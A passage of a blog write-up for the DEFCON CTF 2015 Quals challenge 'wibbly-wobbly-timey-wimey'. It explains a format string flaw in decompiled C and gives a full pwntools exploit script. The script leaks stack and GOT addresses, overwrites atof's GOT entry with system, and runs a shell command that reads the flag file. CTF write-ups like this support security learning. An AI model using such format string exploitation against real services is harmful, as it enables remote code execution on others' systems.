    <span class="k">if</span> <span class="p">(</span> <span class="mi">51</span><span class="p">.</span><span class="mi">492137</span> <span class="o">!=</span> <span class="n">v0</span> <span class="o">||</span> <span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">192878</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinate "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// format string vulnerability</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">" is occupied by another TARDIS.  Materializing there "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"would rip a hole in time and space. Choose again."</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"You safely travel to coordinates %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
    <span class="n">terminate_proc</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code class="language-plaintext highlighter-rouge">atof</code>’s GOT entry into <code class="language-plaintext highlighter-rouge">system</code>’s address, and execute our command by entering our commands as the coordinates.</p>

<p>So to sum up:</p>
<ol>
  <li>Leak the stack address and calculate the return address’ location</li>
  <li>Leak the return address and calculate the text’s base address</li>
  <li>Calculate <code class="language-plaintext highlighter-rouge">atof</code>’s GOT and leak the function pointer</li>
  <li>Calculate <code class="language-plaintext highlighter-rouge">system</code>’s address and overwrite <code class="language-plaintext highlighter-rouge">atof</code>’s GOT entry</li>
  <li>Input coordinates <strong>“[command], [garbage]”</strong> to execute our commands</li>
</ol>

<p>Here’s the exploit. The part that beating the game was done by <strong>yench</strong>, while the rest was done by me.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">2606</span>

<span class="k">def</span> <span class="nf">getMap</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">s</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">24</span><span class="p">]</span>
	<span class="k">print</span> <span class="n">MAP</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">479</span><span class="p">:]</span>
	<span class="n">sql</span><span class="o">=</span><span class="n">MAP</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
	<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
	<span class="n">res</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">)]</span> 
	<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">sql</span><span class="p">:</span>
		<span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
		<span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">l</span>
		<span class="n">i</span><span class="o">+=</span><span class="mi">1</span> 
	<span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">getChar</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">MAP</span><span class="p">):</span>
	<span class="n">x</span><span class="o">=</span><span class="mi">0</span>
	<span class="n">y</span><span class="o">=</span><span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">MAP</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
			<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
				<span class="k">if</span> <span class="n">j</span> <span class="o">==</span> <span class="n">a</span><span class="p">:</span>
					<span class="k">return</span> <span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
			<span class="n">y</span><span class="o">+=</span><span class="mi">1</span>
		<span class="n">x</span><span class="o">+=</span><span class="mi">1</span>
		<span class="n">y</span><span class="o">=</span><span class="mi">0</span>
	<span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>


<span class="n">t</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="c1"># start playing the game
</span><span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"KEY"</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
		<span class="k">print</span> <span class="n">s</span>
		<span class="k">break</span>
	<span class="n">MAP</span> <span class="o">=</span> <span class="n">getMap</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
	<span class="n">GOAL</span><span class="o">=</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">ME</span><span class="o">=</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">GOAL</span><span class="o">=</span><span class="n">getChar</span><span class="p">([</span><span class="s">'E'</span><span class="p">,</span><span class="s">'T'</span><span class="p">],</span><span class="n">MAP</span><span class="p">)</span>
	<span class="k">print</span> <span class="n">GOAL</span>
	<span class="n">ME</span><span class="o">=</span><span class="n">getChar</span><span class="p">([</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">'V'</span><span class="p">,</span><span class="s">'^'</span><span class="p">],</span><span class="n">MAP</span><span class="p">)</span>
	<span class="k">print</span> <span class="n">ME</span>

	<span class="n">drct</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'a'</span>
	<span class="k">elif</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'d'</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'w'</span>
	<span class="k">elif</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">):</span>
		<span class="k">if</span><span class="p">(</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">19</span> <span class="ow">and</span> <span class="n">MAP</span><span class="p">[</span><span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">!=</span><span class="s">'A'</span><span class="p">):</span>
			<span class="n">drct</span><span class="o">+=</span><span class="s">'s'</span>
	<span class="k">if</span> <span class="n">drct</span> <span class="o">==</span> <span class="p">[]</span> <span class="p">:</span>
		<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">:</span>
			<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'a'</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'d'</span>
		<span class="k">elif</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">GOAL</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">:</span>
			<span class="k">if</span> <span class="n">ME</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'w'</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">drct</span><span class="o">+=</span><span class="s">'s'</span>
			
	<span class="k">print</span> <span class="n">drct</span>
	<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">drct</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Done playing, time to send TARDIS KEY
</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending tardis key..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UeSlhCAGEp</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second so the service's able to call sub_BCB()
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
</span><span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># turn on the TARDIS console
</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back to 3 so the rest of our input won't get into sub_BCB()
</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="mf">51.492137</span>
<span class="n">y</span> <span class="o">=</span> <span class="o">-</span><span class="mf">0.192878</span>
<span class="n">pass_xy</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">','</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>

<span class="c1"># constructing format string payload
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="s">".%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">a</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># get the stack address
</span><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">nptr</span> <span class="o">+</span> <span class="mh">0x406</span> <span class="c1"># return address' location
</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"nptr: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ret: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="c1"># padding
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$p"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$s."</span> <span class="c1"># leak the return address
</span><span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c1"># return address
</span><span class="n">text_base</span> <span class="o">=</span> <span class="n">WTF</span> <span class="o">-</span> <span class="mh">0x1491</span>
<span class="n">atof_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x5080</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof_got: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_got</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$p"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$s."</span>  <span class="c1"># leak atof's got
</span><span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>
<span class="n">atof_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">atof_addr</span> <span class="o">+</span> <span class="mi">59728</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="n">byte1</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
<span class="n">byte2</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>

<span class="c1"># use %n to overwrite atof's got entry into system's address
</span><span class="n">fmt1</span> <span class="o">=</span> <span class="n">byte1</span> <span class="o">-</span> <span class="mi">28</span>
<span class="n">fmt2</span> <span class="o">=</span> <span class="n">byte2</span> <span class="o">-</span> <span class="n">fmt1</span> <span class="o">-</span> <span class="mi">28</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt1</span><span class="p">)</span><span class="o">+</span><span class="s">"c"</span><span class="o">+</span><span class="s">"%20$hhn"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt2</span><span class="p">)</span><span class="o">+</span><span class="s">"c%21$hn"</span>
<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span>

<span class="n">t</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="c1"># send cat /home/wwtw/flag;,123 to get flag
</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/write-ups/'>write-ups</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >Python</a>
          
          <a href="/tags/c/"
            class="post-tag no-text-decoration" >C</a>
          
          <a href="/tags/defcon/"
            class="post-tag no-text-decoration" >DEFCON</a>
          
          <a href="/tags/ctf/"
            class="post-tag no-text-decoration" >CTF</a>
          
          <a href="/tags/pwnable/"
            class="post-tag no-text-decoration" >Pwnable</a>
          
          <a href="/tags/format-string/"
            class="post-tag no-text-decoration" >format_string</a>
          
          <a href="/tags/ppc/"
            class="post-tag no-text-decoration" >PPC</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey - Hacking Tube 2.0&url=http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey - Hacking Tube 2.0&u=http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/Migrate-to-Github-Pages/">Migrate to Github Pages</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Old-School/">MeePwn CTF 2017 -- Old School</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-anotherarena/">MeePwn CTF 2017 -- anotherarena</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Brainfuck-1-2/">MeePwn CTF 2017 -- Brainfuck 1 & 2</a></li>
      
        
        
        
        <li><a href="/csaw-ctf-2014-exploitation-200-pybabbies/">CSAW CTF 2014 -- Exploitation 200 pybabbies</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
